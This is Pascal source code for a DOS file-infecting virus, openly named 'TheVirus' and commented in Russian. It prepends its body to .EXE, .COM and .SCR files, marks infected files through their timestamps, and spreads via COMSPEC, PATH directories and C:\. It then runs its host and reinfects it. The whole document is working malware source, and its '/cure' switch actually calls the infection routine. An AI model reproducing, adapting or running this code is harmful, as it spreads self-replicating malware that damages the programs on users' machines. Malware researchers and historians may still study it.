{$A+,B-,D+,E-,F-,G+,I-,L+,N+,O-,P-,Q-,R-,S-,T-,V+,X+,Y+}
{$M 16384,0,0}

program TheVirus;

uses dos;

{.$DEFINE DEBUG}

{$IFDEF DPMI}
const
  virsize = 20000;
{$ELSE}
const
  virsize = 10000;
{$ENDIF}

var
  isfirststart : boolean;

  vir : array[0..virsize-1] of byte;
  buf : array[0..virsize-1] of byte;

{$IFDEF DEBUG}
procedure debug(msg : string);
  begin
    textattr := 2;
    write(msg);
    textattr := 7;
    writeln;
  end;
{$ENDIF}

function cmpvirbuf : boolean;
  var
    i : integer;
  begin
    cmpvirbuf := false;
    for i := low(vir) to high(vir) do
      if vir[i] <> buf[i] then
        exit;
    cmpvirbuf := true;
  end;

procedure read_myself;
  var
    f : file;
    w : word;
  begin

{$IFDEF DEBUG}
    debug('чтение тела вируса из файла '+paramstr(0));
{$ENDIF}

    assign(f, paramstr(0));

    filemode := 0;
    reset(f,1);
    filemode := 2;
    if ioresult<>0 then
    begin
{$IFDEF DEBUG}
      debug('ошибка');
{$ENDIF}
      halt;
    end;

    fillchar(vir, sizeof(vir), 0);
    blockread(f, vir, virsize, w);

    isfirststart := w<>virsize;

    close(f);

{$IFDEF DEBUG}
    debug('считано');
{$ENDIF}

{$IFDEF DEBUG}
    if isfirststart then
      debug('(обнаружен первый запуск вируса)');
{$ENDIF}
  end;

{$IFDEF DEBUG}

function ask(msg : string) : boolean;
  begin

    debug(msg+' (Y/N)');
    repeat
      case upcase(readkey) of
        'Y': begin
               debug('...Yes');
               ask := true;
               exit;
             end;
        'N': begin
               debug('...No');
               ask := false;
               exit;
             end;
      end;
    until false;

  end;

{$ENDIF}

function infect_file(filename : string) : boolean;
  label
    exitinfect;
  var
    r : searchrec;
    f : file;
  begin
{$IFDEF DEBUG}
    debug('заражение файла '+filename);
{$ENDIF}

    infect_file := false;

{$IFDEF DEBUG}
    if not ask('заражать файл?') then
    begin
      infect_file := true;
      exit;
    end;
{$ENDIF}

    findfirst(filename, archive+readonly, r);
    if doserror<>0 then
    begin
{$IFDEF DEBUG}
      debug('файл не найден');
{$ENDIF}
      exit;
    end;

    if r.size < virsize then
    begin
{$IFDEF DEBUG}
      debug('слишком маленький файл, не может быть заражен');
{$ENDIF}
      exit;
    end;

    if r.time and 31 = 13 then
    begin
{$IFDEF DEBUG}
      debug('файл возможно уже заражен');
{$ENDIF}
      exit;
    end;

    assign(f, filename);

    setfattr(f, archive);
    if doserror <> 0 then
    begin
{$IFDEF DEBUG}
      debug('невозможно изменить атрибуты файла');
{$ENDIF}
      exit;
    end;

    reset(f,1);
    if ioresult <> 0 then
    begin
{$IFDEF DEBUG}
      debug('невозможно открыть файл');
{$ENDIF}
      exit;
    end;

    blockread(f, buf, virsize);

    if cmpvirbuf then
    begin
{$IFDEF DEBUG}
      debug('файл уже заражен');
{$ENDIF}
      goto exitinfect;
    end;

    if chr(buf[0])+chr(buf[1]) <> 'MZ' then
    begin
{$IFDEF DEBUG}
      debug('не .EXE-файл');
{$ENDIF}
      goto exitinfect;
    end;

{$IFDEF DEBUG}
    debug('заражение...');
{$ENDIF}

    seek(f, filesize(f));
    blockwrite(f, buf, virsize);

    seek(f, 0);
    blockwrite(f, vir, virsize);

    infect_file := true;

{$IFDEF DEBUG}
    debug('файл заражен');
{$ENDIF}

    r.time := (r.time and (not 31)) or 13;

exitinfect:
    setftime(f, r.time);
    close(f);
    setfattr(f, r.attr);
  end;

function cure_file(filename : string) : boolean;
  label
    exitcure;
  var
    r : searchrec;
    f : file;
  begin
{$IFDEF DEBUG}
    debug('лечение файла '+filename);
{$ENDIF}

    cure_file := false;

    findfirst(filename, archive+readonly, r);
    if doserror<>0 then
    begin
{$IFDEF DEBUG}
      debug('файл не найден');
{$ENDIF}
      exit;
    end;

    if r.size < virsize*2 then
    begin
{$IFDEF DEBUG}
      debug('слишком маленький файл, => не заражен');
{$ENDIF}
      exit;
    end;

    assign(f, filename);

    setfattr(f, archive);
    if doserror <> 0 then
    begin
{$IFDEF DEBUG}
      debug('невозможно изменить атрибуты файла');
{$ENDIF}
      exit;
    end;

    reset(f,1);
    if ioresult <> 0 then
    begin
{$IFDEF DEBUG}
      debug('невозможно открыть файл');
{$ENDIF}
      exit;
    end;

    blockread(f, buf, virsize);

    if not cmpvirbuf then
    begin
{$IFDEF DEBUG}
      debug('файл не заражен');
{$ENDIF}
      goto exitcure;
    end;

{$IFDEF DEBUG}
    debug('лечение...');
{$ENDIF}

    seek(f, filesize(f) - virsize);
    blockread(f, buf, virsize);

    seek(f, 0);
    blockwrite(f, buf, virsize);

    seek(f, filesize(f) - virsize);
    truncate(f);

    cure_file := true;

{$IFDEF DEBUG}
    debug('файл вылечен');
{$ENDIF}

    r.time := r.time and (not 31);

exitcure:
    setftime(f, r.time);
    close(f);
    setfattr(f, r.attr);
  end;

function infect_dir(dir : string; maxreclevel, maxfile : integer) : integer;
  var
    r : searchrec;
    d : dirstr;
    n : namestr;
    e : extstr;
    inffile : integer;
  begin

{$IFDEF DEBUG}
    debug('поиск файлов в директории "'+dir+'"');
{$ENDIF}

    dir := FExpand(dir);
    if copy(dir,1,1) < 'C' then
      exit;

    if dir <> '' then
      if dir[length(dir)] <> '\' then
        dir := dir + '\';

    inffile := 0;

    findfirst(dir+'*.*', anyfile,  r);
    while doserror=0 do
    begin

      if r.attr and directory <> 0 then begin

        if r.name[1]<>'.' then
          if maxreclevel>0 then
            inc(inffile, infect_dir(dir+r.name+'\', maxreclevel-1, maxfile));

      end else begin

        fsplit(r.name, d,n,e);

        if (e='.EXE') or (e='.COM') or (e='.SCR') then
          if infect_file(dir+r.name) then
            inc(inffile);

      end;

      if inffile>=maxfile then
        break;

      findnext(r);

    end; { while }

    infect_dir := inffile;

  end; { infect_dir }

procedure infect_path;
  var
    s, q : string;
  begin
    s := getenv('PATH');
    while s<>'' do
    begin
      q := '';
      while (s<>'') and (s[1]<>';') do
      begin
        q := q + s[1];
        delete(s,1,1);
      end;
      delete(s,1,1);
      infect_dir(q, 0, 10);
    end;
  end;

label
  exitvirus;

begin

{$IFDEF DEBUG}
  debug('запущен вирус. нажмите пробел...');
  readkey;
{$ENDIF}

  read_myself;

  if paramstr(1)='/infect' then
  begin
    infect_file(paramstr(2));
    goto exitvirus;
  end;
  if paramstr(1)='/cure' then
  begin
    infect_file(paramstr(2));
    goto exitvirus;
  end;

  if isfirststart then goto exitvirus;

{$IFDEF DEBUG}
  if ask('Выполнять поиск и заражение файлов?') then
  begin
{$ENDIF}

    infect_file(getenv('COMSPEC'));
    infect_path;
    infect_dir('..\',0,1);
    infect_dir('..\..\',0,1);
    infect_dir('C:\',3,5);

{$IFDEF DEBUG}
  end;

  if ask('Выполнять текущий файл?') then
  begin
{$ENDIF}

    cure_file(paramstr(0));

{$IFDEF DEBUG}
    debug('Выполнение файла...');
{$ENDIF}
    swapvectors;
    exec(paramstr(0), string(ptr(PrefixSeg,$80)^));
    swapvectors;
{$IFDEF DEBUG}
    debug('...файл выполнен');
{$ENDIF}

    infect_file(paramstr(0));

{$IFDEF DEBUG}
  end;
{$ENDIF}

exitvirus:

{$IFDEF DEBUG}
  debug('выход из вируса');
{$ENDIF}

end.
